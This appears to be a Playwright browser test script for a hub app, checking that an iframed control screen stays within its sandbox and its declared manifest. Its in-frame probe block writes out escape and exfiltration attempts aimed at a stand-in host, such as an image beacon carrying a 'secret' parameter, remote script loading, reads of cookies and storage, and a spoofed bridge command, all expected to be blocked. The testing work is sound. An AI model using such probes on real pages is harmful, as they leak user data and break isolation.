"""Real-browser check that a screen is held to its sandbox and its manifest.

Not part of `deno task test`, because it needs Chrome and Playwright:
    deno task hub --port=8099 &
    python3 tests/browser/screen_sandbox.py http://127.0.0.1:8099 [folder for screenshots]
Exits 0 when every check passes.
"""
import asyncio, json, sys, urllib.request
from playwright.async_api import async_playwright

base = sys.argv[1].rstrip("/")
shots = sys.argv[2] if len(sys.argv) > 2 else None
get = lambda p: json.load(urllib.request.urlopen(base + p))
LEVEL = "console/input/1/bus/1/level"
results = []

def check(name, ok, detail=""):
    results.append(ok)
    print(("PASS  " if ok else "FAIL  ") + name + (f"\n      {detail}" if detail and not ok else ""))
    return ok

# Run inside the screen: try every way out, report what happened.
PROBES = """
async () => {
  const out = {};
  const attempt = async (name, fn) => { try { await fn(); out[name] = "ALLOWED"; } catch (e) { out[name] = "blocked"; } };
  const socket = (url) => new Promise((ok, no) => { const w = new WebSocket(url); w.onopen = () => { w.close(); ok(); }; w.onerror = () => no(new Error("refused")); });
  const base = location.origin === "null" ? document.baseURI.split("/screens/")[0] : location.origin;
  await attempt("read the hub's log over HTTP", () => fetch(base + "/api/log"));
  await attempt("read the hub's catalog over HTTP", () => fetch(base + "/api/catalog"));
  await attempt("open its own connection to the hub", () => socket(base.replace("http", "ws") + "/ws?screen=one-fader"));
  await attempt("reach the internet", () => fetch("https://example.com", { mode: "no-cors" }));
  await attempt("load a script from the internet", () => new Promise((ok, no) => { const s = document.createElement("script"); s.src = "https://example.com/x.js"; s.onload = ok; s.onerror = () => no(new Error()); document.head.append(s); }));
  await attempt("send data out through an image", () => new Promise((ok, no) => { const i = new Image(); i.onload = ok; i.onerror = () => no(new Error()); i.src = "https://example.com/leak.png?secret=1"; }));
  await attempt("read the page around it", () => parent.document.title);
  await attempt("read the hub page's storage", () => localStorage.getItem("x"));
  await attempt("read cookies", () => { const c = document.cookie; });
  await attempt("open a popup", () => { const w = window.open("https://example.com"); if (!w) throw new Error(); w.close(); });
  await attempt("send the whole page somewhere else", () => { top.location.href = "https://example.com"; });
  out.origin = self.origin;
  return out;
}
"""

async def main():
    async with async_playwright() as p:
        b = await p.chromium.launch(executable_path="/usr/bin/google-chrome", args=["--no-sandbox"])
        ctx = await b.new_context(viewport={"width": 390, "height": 844}, has_touch=True, is_mobile=True, device_scale_factor=2)
        errors = []
        pg = await ctx.new_page(); pg2 = await ctx.new_page()
        pg.on("pageerror", lambda e: errors.append(str(e)))
        await pg.goto(base + "/"); await pg2.goto(base + "/")
        await pg.wait_for_timeout(900)
        check("the home address lands on the home screen, inside the hub's shell", pg.url.endswith("/s/one-fader"), pg.url)
        fr = next((f for f in pg.frames if "/screens/one-fader/" in f.url), None)
        fr2 = next((f for f in pg2.frames if "/screens/one-fader/" in f.url), None)
        if not check("the screen is framed", fr is not None and fr2 is not None):
            await b.close(); return
        check("the screen is linked to the hub through the shell", await fr.inner_text("#linkText") == "Connected")
        check("it shows the board's state", "Input 1" in await fr.inner_text("#inputName"))

        # Drag the fader with a finger.
        cdp = await ctx.new_cdp_session(pg)
        el = await fr.query_selector("#fader"); box = await el.bounding_box()
        y = box["y"] + box["height"] / 2
        xs = [box["x"] + box["width"] * (0.05 + 0.01 * k) for k in range(70)]
        await cdp.send("Input.dispatchTouchEvent", {"type": "touchStart", "touchPoints": [{"x": xs[0], "y": y}]})
        for x in xs[1:]:
            await cdp.send("Input.dispatchTouchEvent", {"type": "touchMove", "touchPoints": [{"x": x, "y": y}]}); await pg.wait_for_timeout(12)
        await cdp.send("Input.dispatchTouchEvent", {"type": "touchEnd", "touchPoints": []}); await pg.wait_for_timeout(900)
        held = get("/api/state?plugin=sim-console")[LEVEL]
        shown = (await fr.inner_text("#db")).replace("\n", "").replace("dB", "")
        shown2 = (await fr2.inner_text("#db")).replace("\n", "").replace("dB", "")
        check("a drag reaches the board", held == -10, f"board holds {held}")
        check("the screen shows what the board holds", float(shown) == held, shown)
        check("a second phone follows", float(shown2) == held, shown2)
        check("the screen's log list is filled through the bridge", "set the level" in await fr.inner_text("#log"))
        if shots: await pg.screenshot(path=f"{shots}/screen-in-shell.png", full_page=True)

        # Now behave badly from inside the screen.
        got = await fr.evaluate(PROBES)
        check("the screen has no origin of its own", got.pop("origin") == "null")
        for name, outcome in got.items():
            check(f"the screen cannot {name}", outcome == "blocked", outcome)
        # A form posted to the internet fails silently inside a sandbox, so judge it by where the pages end up.
        await fr.evaluate("""() => { const f = document.createElement("form"); f.action = "https://example.com"; f.method = "post"; document.body.append(f); f.submit(); }""")
        await pg.wait_for_timeout(600)
        check("the screen cannot submit a form to the internet", "/screens/one-fader/" in fr.url and pg.url.endswith("/s/one-fader"), f"{fr.url} | {pg.url}")

        # Ask the hub, through the bridge, for something the manifest does not declare.
        ack = await fr.evaluate("""() => new Promise((res) => {
            addEventListener("message", (e) => { if (e.data.type === "ack" && e.data.ref === "x1") res(e.data); });
            parent.postMessage({ type: "set", plugin: "sim-switch", key: "switch/outlet/1/on", value: true, ref: "x1" }, "*");
            setTimeout(() => res({ timeout: true }), 1500);
        })""")
        check("a screen that declared only the soundboard cannot flip a switch", ack.get("ok") is False and ack.get("error", {}).get("code") == "not_allowed", json.dumps(ack))
        check("the switch did not move", get("/api/state?plugin=sim-switch")["switch/outlet/1/on"] is False)
        rejected = [e for e in get("/api/log?type=skillfully.command.rejected") if e["data"].get("code") == "not_allowed"]
        check("the attempt is in the log, with the screen named", len(rejected) >= 1 and all(e["via"] == "screen/one-fader" for e in rejected))
        seen = await fr.evaluate("""() => new Promise((res) => {
            let saw = false;
            addEventListener("message", (e) => { if (e.data.type === "state" && e.data.plugin === "sim-switch") saw = true; });
            setTimeout(() => res(saw), 600);
        })""")
        urllib.request.urlopen(base + "/api/state?plugin=sim-switch")
        check("the screen is never told about the switch", seen is False)
        check("the shell forwards only requests a screen may make", await fr.evaluate("""() => new Promise((res) => {
            addEventListener("message", (e) => { if (e.data.type === "hello") res(false); });
            parent.postMessage({ type: "hello", actor: "person:someone-else" }, "*");
            setTimeout(() => res(true), 500);
        })"""))
        check("no page errors", not errors, "; ".join(errors))
        await b.close()

asyncio.run(main())
print(f"\n{sum(results)} of {len(results)} checks passed")
sys.exit(0 if all(results) else 1)
